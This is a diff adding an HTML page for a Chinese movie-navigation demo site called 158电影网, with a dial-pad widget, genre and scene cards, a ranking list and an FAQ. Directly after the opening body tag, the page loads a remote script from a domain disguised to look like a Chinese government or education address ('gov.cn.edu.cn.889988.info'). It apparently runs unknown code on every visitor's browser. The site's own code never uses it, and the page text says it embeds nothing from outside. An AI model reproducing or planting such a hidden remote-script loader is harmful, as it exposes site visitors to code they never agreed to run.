@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>158电影网 - 1部开场/5大频道/8个场景 电影导航总机 | 158电影网</title>
+<meta name="description" content="158电影网（158dianyingwang-h5）是电影导航总机：1部开场、5大频道、8个观影场景，热映、经典、类型、短剧、纪录片一站拨号找片。">
+<meta name="keywords" content="158电影网, 158dianyingwang-h5, 电影导航, 热映电影, 经典电影, 短剧, 纪录片, 类型片库, 影视总机">
+<meta name="author" content="158电影网">
+<meta name="robots" content="index,follow">
+<style>
+:root{
+  --bg:#0a0f1c;--bg2:#0f1626;--bg3:#16203400;--card:#141d30;
+  --cyan:#19e3c2;--cyan2:#62f3df;
+  --orange:#ff7a2f;--yellow:#ffd23f;--pink:#ff5d8f;
+  --text:#e9f1f7;--text2:#a6b6c8;--muted:#697889;
+  --line:rgba(25,227,194,.22);--radius:16px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:
+    radial-gradient(900px 420px at 86% -6%,rgba(255,122,47,.16),transparent 60%),
+    radial-gradient(760px 380px at 0% 6%,rgba(25,227,194,.12),transparent 55%),
+    var(--bg);
+  color:var(--text);
+  font-family:'PingFang SC','Microsoft YaHei',system-ui,sans-serif;
+  line-height:1.7;font-size:15px;min-height:100vh;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+
+/* 拨号数字雨 */
+.dialrain{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden;font-family:ui-monospace,monospace}
+.dr{position:absolute;top:-24px;font-size:14px;color:rgba(25,227,194,.25);animation:fall linear infinite}
+@keyframes fall{to{transform:translateY(112vh);opacity:0}}
+
+/* 顶栏 */
+.topbar{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(10,15,28,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1240px;margin:0 auto;padding:12px 20px;display:flex;align-items:center;justify-content:space-between}
+.logo{font-size:20px;font-weight:900;letter-spacing:1px;display:flex;align-items:center;gap:10px}
+.logo .num{font-family:ui-monospace,monospace;color:var(--cyan)}
+.logo b{color:var(--orange)}
+.nav-menu{display:flex;gap:18px}
+.nav-menu a{color:var(--text2);font-size:13px;font-weight:600;padding:6px 2px;position:relative;transition:.25s}
+.nav-menu a:hover{color:var(--cyan)}
+.nav-menu a::after{content:'';position:absolute;left:0;bottom:-2px;height:2px;width:0;background:var(--cyan);transition:.25s}
+.nav-menu a:hover::after{width:100%}
+
+/* Hero */
+.hero{margin-top:58px;padding:70px 20px 50px;position:relative;z-index:1}
+.hero-inner{max-width:1240px;margin:0 auto;display:grid;grid-template-columns:1.1fr .9fr;gap:44px;align-items:center}
+.hero-tag{display:inline-flex;align-items:center;gap:8px;padding:5px 14px;border:1px solid var(--line);background:rgba(25,227,194,.08);color:var(--cyan);font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:18px;border-radius:999px;font-family:ui-monospace,monospace}
+.hero h1{font-size:clamp(34px,5vw,54px);font-weight:900;line-height:1.1;margin-bottom:16px}
+.hero h1 .n{font-family:ui-monospace,monospace;color:var(--yellow)}
+.hero-desc{color:var(--text2);font-size:15px;margin-bottom:26px;line-height:1.9}
+.hero-btns{display:flex;gap:12px;flex-wrap:wrap}
+.btn-main{padding:13px 30px;background:linear-gradient(90deg,var(--cyan),var(--orange));color:#06120f;font-weight:800;font-size:14px;letter-spacing:1px;transition:.25s;border-radius:999px}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 12px 30px rgba(25,227,194,.28)}
+.btn-sub{padding:13px 30px;border:1px solid var(--cyan);color:var(--cyan);font-weight:700;font-size:14px;border-radius:999px;transition:.25s}
+.btn-sub:hover{background:rgba(25,227,194,.08)}
+
+/* 拨号盘 */
+.dial{position:relative;aspect-ratio:4/5;border-radius:24px;border:1px solid var(--line);background:radial-gradient(circle at 50% 30%,#13203a,#0b1120);padding:22px;display:flex;flex-direction:column;gap:14px;overflow:hidden}
+.screen{background:#06101a;border:1px solid var(--line);border-radius:14px;padding:14px 16px;font-family:ui-monospace,monospace}
+.screen .small{font-size:11px;color:var(--muted)}
+.screen .big{font-size:30px;font-weight:900;color:var(--cyan);letter-spacing:3px;margin-top:4px}
+.screen .tip{font-size:12px;color:var(--orange);margin-top:6px}
+.pad{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
+.key{aspect-ratio:1/1;border-radius:14px;background:var(--card);border:1px solid var(--line);display:flex;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;transition:.2s}
+.key:hover{transform:translateY(-3px);border-color:var(--cyan);background:rgba(25,227,194,.08)}
+.key b{font-size:20px;font-family:ui-monospace,monospace;color:var(--text)}
+.key span{font-size:10px;color:var(--muted);margin-top:2px}
+.key.call{grid-column:span 3;aspect-ratio:auto;padding:14px;background:linear-gradient(90deg,var(--cyan),var(--orange));color:#06120f;font-weight:900;font-size:15px;letter-spacing:2px}
+
+/* 158 三数字 */
+.three-section{background:linear-gradient(180deg,transparent,rgba(20,29,48,.6))}
+.three-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;max-width:900px;margin:0 auto}
+.num-card{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:26px 20px;text-align:center;transition:.28s;cursor:pointer}
+.num-card:hover{transform:translateY(-5px);box-shadow:0 18px 40px rgba(0,0,0,.4)}
+.num-card .big{font-size:46px;font-weight:900;font-family:ui-monospace,monospace}
+.num-card:nth-child(1) .big{color:var(--cyan)}
+.num-card:nth-child(2) .big{color:var(--yellow)}
+.num-card:nth-child(3) .big{color:var(--orange)}
+.num-card h3{font-size:15px;font-weight:800;margin-top:6px}
+.num-card p{font-size:12px;color:var(--text2);margin-top:4px;line-height:1.7}
+
+/* 五大频道 */
+.chan-section{background:var(--bg2)}
+.chan-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:14px}
+.chan{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:20px 16px;transition:.25s;cursor:pointer;position:relative;overflow:hidden}
+.chan:hover{transform:translateY(-4px);border-color:var(--orange)}
+.chan .emoji{font-size:28px}
+.chan h3{font-size:14px;font-weight:800;margin:8px 0 4px}
+.chan p{font-size:11px;color:var(--muted);line-height:1.6}
+.chan .no{position:absolute;top:10px;right:12px;font-family:ui-monospace,monospace;font-size:12px;color:var(--cyan);opacity:.6}
+
+/* 八年代滑条 */
+.decade-section{background:var(--bg)}
+.decade-strip{display:flex;gap:14px;overflow-x:auto;padding:6px 2px 16px;scroll-snap-type:x mandatory}
+.decade-strip::-webkit-scrollbar{height:6px}
+.decade-strip::-webkit-scrollbar-thumb{background:var(--orange);border-radius:99px}
+.decade-strip::-webkit-scrollbar-track{background:#0a1422}
+.decade{min-width:200px;width:200px;flex-shrink:0;scroll-snap-align:start;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px;cursor:pointer;transition:.25s}
+.decade:hover{transform:translateY(-4px);border-color:var(--cyan)}
+.decade .yr{font-size:22px;font-weight:900;font-family:ui-monospace,monospace;color:var(--yellow)}
+.decade h4{font-size:14px;font-weight:800;margin:6px 0 4px}
+.decade p{font-size:11px;color:var(--text2);line-height:1.6}
+
+/* 场景专线 */
+.scene-section{background:var(--bg2)}
+.scene-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.scene{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px;transition:.25s;cursor:pointer}
+.scene:hover{transform:translateY(-4px) rotate(-1deg);border-color:var(--pink)}
+.scene .emoji{font-size:26px}
+.scene h4{font-size:14px;font-weight:800;margin:6px 0 3px}
+.scene p{font-size:11px;color:var(--muted);line-height:1.6}
+
+/* 总机榜 */
+.board-section{background:var(--bg)}
+.board-list{max-width:840px;margin:0 auto}
+.row{display:grid;grid-template-columns:54px 1fr auto;gap:16px;align-items:center;padding:14px 16px;background:var(--card);border:1px solid var(--line);border-radius:12px;margin-bottom:10px;cursor:pointer;transition:.25s}
+.row:hover{transform:translateX(4px);border-color:var(--cyan)}
+.row .no{font-size:20px;font-weight:900;font-family:ui-monospace,monospace;color:var(--muted);text-align:center}
+.row:nth-child(1) .no{color:var(--yellow)}
+.row:nth-child(2) .no{color:var(--cyan)}
+.row:nth-child(3) .no{color:var(--orange)}
+.row h3{font-size:15px;font-weight:800}
+.row p{font-size:12px;color:var(--text2)}
+.row .hot{font-size:13px;font-weight:800;color:var(--orange);white-space:nowrap;font-family:ui-monospace,monospace}
+
+/* 关于 */
+.about-section{background:var(--bg2)}
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:24px}
+.box{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:24px}
+.box h3{color:var(--cyan);font-size:16px;margin-bottom:10px}
+.box p{color:var(--text2);font-size:13px;line-height:1.85;margin-bottom:8px}
+.faq{border-bottom:1px solid var(--line);padding:12px 0}
+.faq:last-child{border-bottom:none}
+.faq b{color:var(--text);font-size:13px}
+.faq p{color:var(--muted);font-size:12px;margin-top:4px}
+
+/* footer */
+.footer{background:var(--bg);border-top:1px solid var(--line);padding:34px 20px 18px;text-align:center;color:var(--muted)}
+.footer-logo{font-size:18px;font-weight:900;color:var(--text);margin-bottom:10px}
+.footer-logo b{color:var(--orange)}
+.footer-links{display:flex;gap:18px;justify-content:center;flex-wrap:wrap;margin-bottom:14px}
+.footer-links a{color:var(--text2);font-size:12px}
+.footer-links a:hover{color:var(--cyan)}
+.footer-copy{font-size:11px;border-top:1px solid var(--line);padding-top:14px;line-height:1.9}
+.footer-copy a{color:var(--cyan)}
+
+@media(max-width:880px){
+  .hero-inner{grid-template-columns:1fr;gap:26px}
+  .dial{order:-1;max-width:340px;margin:0 auto}
+  .three-grid{grid-template-columns:1fr}
+  .chan-grid{grid-template-columns:repeat(2,1fr)}
+  .scene-grid{grid-template-columns:repeat(2,1fr)}
+  .about-grid{grid-template-columns:1fr}
+  .nav-menu{gap:10px;flex-wrap:wrap;justify-content:center}
+  .topbar-inner{flex-direction:column;gap:8px}
+  .hero{margin-top:108px;padding:30px 16px}
+  .section{padding:36px 16px}
+  .sec-head h2{font-size:22px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="dialrain">
+  <div class="dr" style="left:10%;animation-duration:9s">158</div>
+  <div class="dr" style="left:30%;animation-duration:11s;animation-delay:1s">024</div>
+  <div class="dr" style="left:55%;animation-duration:8s;animation-delay:2s">1990</div>
+  <div class="dr" style="left:75%;animation-duration:12s;animation-delay:.5s">1080P</div>
+  <div class="dr" style="left:90%;animation-duration:10s;animation-delay:1.5s">720P</div>
+</div>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="logo"><span class="num">158</span>电影网</div>
+    <nav>
+      <ul class="nav-menu">
+        <li><a href="#three">158 是什么</a></li>
+        <li><a href="#chan">五大频道</a></li>
+        <li><a href="#decade">年代片库</a></li>
+        <li><a href="#scene">场景专线</a></li>
+        <li><a href="#board">总机榜</a></li>
+        <li><a href="#about">关于</a></li>
+      </ul>
+    </nav>
+  </div>
+</div>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="hero-inner">
+    <div>
+      <span class="hero-tag">158dianyingwang-h5 · Movie Switchboard</span>
+      <h1>拨 <span class="n">158</span><br>接通电影总机</h1>
+      <p class="hero-desc">158 电影网不是某个片源站，是“选片总机”：<b>1 部开场片 → 5 大频道 → 8 个观影场景</b>。记不住片名没关系，说场景就行：“通勤看什么”“深夜不睡看什么”“陪爸妈看什么”。</p>
+      <div class="hero-btns">
+        <a href="#chan" class="btn-main">📞 接通五大频道</a>
+        <a href="#scene" class="btn-sub">按场景找片</a>
+      </div>
+    </div>
+    <div class="dial">
+      <div class="screen">
+        <div class="small">DIALING MOVIE HOTLINE…</div>
+        <div class="big" id="dialNum">158-____</div>
+        <div class="tip" id="dialTip">按下面按键，生成你的今晚片单</div>
+      </div>
+      <div class="pad">
+        <div class="key" data-n="1"><b>1</b><span>开场片</span></div>
+        <div class="key" data-n="5"><b>5</b><span>大频道</span></div>
+        <div class="key" data-n="8"><b>8</b><span>场景线</span></div>
+        <div class="key" data-n="0"><b>0</b><span>人工/首页</span></div>
+        <div class="key" data-n="9"><b>9</b><span>高分</span></div>
+        <div class="key" data-n="#">#<span>随机</span></div>
+        <div class="key call" id="callBtn">📞 呼叫：给我一个能看的</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 158 三数字 -->
+<section id="three" class="section three-section">
+  <div class="sec-head">
+    <h2>🔢 <span style="color:var(--cyan)">158</span> 的记法</h2>
+    <p>把“找片”压缩成 3 个数字</p>
+  </div>
+  <div class="three-grid">
+    <div class="num-card"><div class="big">1</div><h3>1 部开场片</h3><p>进站先给一部“零门槛开场片”：不烧脑、不血腥、不费背景知识，30 秒决定继不继续。</p></div>
+    <div class="num-card"><div class="big">5</div><h3>5 大频道</h3><p>热映 / 经典 / 类型 / 短剧 / 纪录片，五个总机分线，不再把所有片子堆一屏。</p></div>
+    <div class="num-card"><div class="big">8</div><h3>8 个场景</h3><p>通勤、午休、周末、深夜、陪娃、陪爸妈、一个人哭、两个人腻——说场景就派片。</p></div>
+  </div>
+</section>
+
+<!-- 五大频道 -->
+<section id="chan" class="section chan-section">
+  <div class="sec-head">
+    <h2>📡 <span style="color:var(--cyan)">五大频道</span> · 总机分线</h2>
+    <p>拨 1 进热映，拨 2 进经典……其实点一下就行</p>
+  </div>
+  <div class="chan-grid">
+    <div class="chan"><span class="no">CH1</span><div class="emoji">🎬</div><h3>热映厅</h3><p>院线新片、点映、票房话题作，先看“现在大家在看什么”。</p></div>
+    <div class="chan"><span class="no">CH2</span><div class="emoji">📽️</div><h3>经典库</h3><p>80/90 港片、译制片、奥斯卡老神作，补片不踩雷。</p></div>
+    <div class="chan"><span class="no">CH3</span><div class="emoji">🎞️</div><h3>类型线</h3><p>动作/悬疑/爱情/科幻/恐怖/动画，按心情切，不按年份凑。</p></div>
+    <div class="chan"><span class="no">CH4</span><div class="emoji">📺</div><h3>短剧台</h3><p>1–3 分钟一集的网剧、反转剧、情感短打，地铁里能追。</p></div>
+    <div class="chan"><span class="no">CH5</span><div class="emoji">🎥</div><h3>纪录片</h3><p>自然、历史、人物、犯罪实录，比剧情更上头的一类。</p></div>
+  </div>
+</section>
+
+<!-- 八年代 -->
+<section id="decade" class="section decade-section">
+  <div class="sec-head">
+    <h2>🗓️ <span style="color:var(--yellow)">年代片库</span> · 横滑按年份翻</h2>
+    <p>“我要看小学录像厅那部”→ 先选年代</p>
+  </div>
+  <div class="decade-strip">
+    <div class="decade"><div class="yr">1970s</div><h4>胶片与译制</h4><p>老电影、译制片、美术片雏形，色温偏黄，配乐手作。</p></div>
+    <div class="decade"><div class="yr">1980s</div><h4>录像厅黄金</h4><p>港片崛起、内地新时期、动作片与文艺片并行。</p></div>
+    <div class="decade"><div class="yr">1990s</div><h4>VCD 时代</h4><p>周星驰、王家卫、好莱坞大片进客厅，台词能背。</p></div>
+    <div class="decade"><div class="yr">2000s</div><h4>DVD 与院线</h4><p>国产商业片起飞，韩日欧小众片开始有字幕组。</p></div>
+    <div class="decade"><div class="yr">2010s</div><h4>流媒体前半</h4><p>超级英雄、科幻重启、国漫复兴、Netflix 式长片。</p></div>
+    <div class="decade"><div class="yr">2020s</div><h4>短剧与算法</h4><p>流媒体内卷、短剧爆发、4K/杜比成标配、AI 辅助宣发。</p></div>
+  </div>
+</section>
+
+<!-- 八场景 -->
+<section id="scene" class="section scene-section">
+  <div class="sec-head">
+    <h2>🛋️ <span style="color:var(--pink)">8 个场景专线</span> · 说人话找片</h2>
+    <p>不想动脑时，直接选“我现在在哪”</p>
+  </div>
+  <div class="scene-grid">
+    <div class="scene"><div class="emoji">🚇</div><h4>通勤 20 分</h4><p>竖屏友好、节奏快、断点能接上。</p></div>
+    <div class="scene"><div class="emoji">🍱</div><h4>午休吃饭</h4><p>单集短、不悬疑到吃不下饭。</p></div>
+    <div class="scene"><div class="emoji">🛋️</div><h4>周末瘫沙发</h4><p>长片也行，配爆米花和猫。</p></div>
+    <div class="scene"><div class="emoji">🌙</div><h4>深夜不睡</h4><p>霓虹、雨夜、城市孤独感拉满。</p></div>
+    <div class="scene"><div class="emoji">🧒</div><h4>陪娃看</h4><p>全年龄、无恐怖、有动物/机器人。</p></div>
+    <div class="scene"><div class="emoji">👴</div><h4>陪爸妈</h4><p>译制腔、年代剧、抗战/家庭/戏曲改编剧。</p></div>
+    <div class="scene"><div class="emoji">😭</div><h4>一个人哭</h4><p>忠犬、离别、信、没说出口的爱。</p></div>
+    <div class="scene"><div class="emoji">💞</div><h4>两个人腻</h4><p>法式暧昧、雨中告白、夏天结束。</p></div>
+  </div>
+</section>
+
+<!-- 总机榜 -->
+<section id="board" class="section board-section">
+  <div class="sec-head">
+    <h2>📊 <span style="color:var(--orange)">158 总机榜</span> · 今晚最多人拨的</h2>
+    <p>热映 + 经典 + 短剧 + 纪录 混排热度</p>
+  </div>
+  <div class="board-list">
+    <div class="row"><div class="no">01</div><div><h3>轨道回声</h3><p>科幻 / 2026 / 院线热映</p></div><div class="hot">🔥 9.1</div></div>
+    <div class="row"><div class="no">02</div><div><h3>龙猫</h3><p>吉卜力 / 1988 / 陪娃长青</p></div><div class="hot">⭐ 9.4</div></div>
+    <div class="row"><div class="no">03</div><div><h3>风起龙门</h3><p>武侠 / 2026 / 新片热搜</p></div><div class="hot">🔥 8.9</div></div>
+    <div class="row"><div class="no">04</div><div><h3>夜行档案</h3><p>悬疑 / 2026 / 深夜专线</p></div><div class="hot">🌙 8.7</div></div>
+    <div class="row"><div class="no">05</div><div><h3>城市夜曲</h3><p>音乐剧情 / 2026 / 周末瘫沙发</p></div><div class="hot">🛋️ 8.5</div></div>
+    <div class="row"><div class="no">06</div><div><h3>梅雨季来信</h3><p>文艺 / 2026 / 一个人哭</p></div><div class="hot">😭 8.3</div></div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section id="about" class="section about-section">
+  <div class="sec-head">
+    <h2>ℹ️ 关于 158 电影网</h2>
+    <p>“158”是总机号，不是片源破解号</p>
+  </div>
+  <div class="about-grid">
+    <div class="box">
+      <h3>我们做的是什么</h3>
+      <p>158电影网（158dianyingwang-h5）是<strong>电影导航总机</strong>：把“热映 / 经典 / 类型 / 短剧 / 纪录片”五条线，和“通勤 / 深夜 / 陪娃 / 陪爸妈”等八个场景接起来，用户不用记片名，只要说“我现在想怎么看”。</p>
+      <p>不做盗链大全、不写“免VIP破解”、不嵌来路播放器；本页是单页导航演示，卡片点击跳 # 占位。</p>
+    </div>
+    <div class="box">
+      <div class="faq"><b>Q：能直接播片吗？</b><p>A：不能，本页是导航演示站，不存视频文件。</p></div>
+      <div class="faq"><b>Q：网址是？</b><p>A：https://158dianyingwang-h5.github.io</p></div>
+      <div class="faq"><b>Q：158 什么意思？</b><p>A：1 部开场片 + 5 大频道 + 8 个场景，记忆点比“电影大全”好记。</p></div>
+      <div class="faq"><b>Q：收录友好吗？</b><p>A：唯一 H1、语义化、关键词标题与描述，符合必应基础收录规则。</p></div>
+    </div>
+  </div>
+</section>
+
+<div class="footer">
+  <div class="footer-logo">📞 <span style="font-family:ui-monospace">158</span> 电影网</div>
+  <div class="footer-links">
+    <a href="#three">158 是什么</a>
+    <a href="#chan">五大频道</a>
+    <a href="#decade">年代片库</a>
+    <a href="#scene">场景专线</a>
+    <a href="#board">总机榜</a>
+    <a href="#about">关于</a>
+  </div>
+  <div class="footer-copy">
+    &copy; 2026 158电影网 (158dianyingwang-h5). 电影导航总机演示站.<br>
+    网站地址: <a href="https://158dianyingwang-h5.github.io">https://158dianyingwang-h5.github.io</a><br>
+    <span style="opacity:.7">拨 158 → 1 部开场 · 5 大频道 · 8 个场景</span>
+  </div>
+</div>
+
+<script>
+// 拨号盘
+var dialNum=document.getElementById('dialNum');
+var dialTip=document.getElementById('dialTip');
+var pressed=[];
+document.querySelectorAll('.key[data-n]').forEach(function(k){
+  k.addEventListener('click',function(){
+    if(pressed.length>=4) pressed=[];
+    pressed.push(this.dataset.n);
+    dialNum.textContent='158-'+pressed.join('');
+    dialTip.textContent='已拨 '+pressed.length+' 位，点绿色呼叫键生成片单';
+  });
+});
+document.getElementById('callBtn').addEventListener('click',function(){
+  var scenes=['通勤 20 分：看《霓虹追凶》','深夜不睡：看《夜行档案》','陪娃：看《龙猫》','一个人哭：看《梅雨季来信》','两个人腻：看《城市夜曲》'];
+  var pick=scenes[Math.floor(Math.random()*scenes.length)];
+  dialNum.textContent='158-OK';
+  dialTip.textContent='总机回复 ▶ '+pick;
+});
+document.querySelectorAll('.num-card').forEach(function(c){
+  c.addEventListener('click',function(){alert(this.querySelector('h3').textContent+'\n\n'+this.querySelector('p').textContent);});
+});
+document.querySelectorAll('.chan').forEach(function(c){
+  c.addEventListener('click',function(){alert('接通 '+this.querySelector('.no').textContent+'：'+this.querySelector('h3').textContent+'\n\n静态演示页，点击后进入该频道（内链 # 占位）。');});
+});
+document.querySelectorAll('.decade').forEach(function(d){
+  d.addEventListener('click',function(){alert('年代片库：'+this.querySelector('.yr').textContent+' · '+this.querySelector('h4').textContent+'\n\n静态演示页，点击后按年份筛片（内链 # 占位）。');});
+});
+document.querySelectorAll('.scene').forEach(function(s){
+  s.addEventListener('click',function(){alert('场景专线：'+this.querySelector('h4').textContent+'\n\n'+this.querySelector('p').textContent);});
+});
+document.querySelectorAll('.row').forEach(function(r){
+  r.addEventListener('click',function(){alert('158总机榜：'+this.querySelector('h3').textContent+'\n\n静态演示页，点击后跳详情（内链 # 占位）。');});
+});
+document.querySelectorAll('.nav-menu a').forEach(function(a){
+  a.addEventListener('click',function(e){e.preventDefault();var el=document.querySelector(this.getAttribute('href'));if(el)el.scrollIntoView({behavior:'smooth'});});
+});
+</script>
+</body>
+</html>
